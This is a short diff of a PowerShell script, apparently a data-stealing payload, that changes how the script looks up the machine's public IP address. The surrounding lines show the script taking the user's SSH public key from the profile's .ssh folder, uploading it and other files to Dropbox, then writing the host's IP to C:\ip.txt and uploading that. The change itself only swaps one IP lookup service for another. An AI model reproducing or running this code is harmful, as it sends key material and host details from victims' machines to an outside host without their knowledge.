@@ -34,6 +34,6 @@ $pub = $env:USERPROFILE\.ssh\id_rsa.pub
 
 DropBox-Upload -FileName $filename
 DropBox-Upload -FileName $pub
-$currentip = (Invoke-WebRequest ifconfig.me/ip).Content
+$currentip = Invoke-RestMethod -uri (“https://api.ipify.org/”)
 $currentip | Out-File "C:\ip.txt"
 DropBox-Upload -FileName "C:\ip.txt"
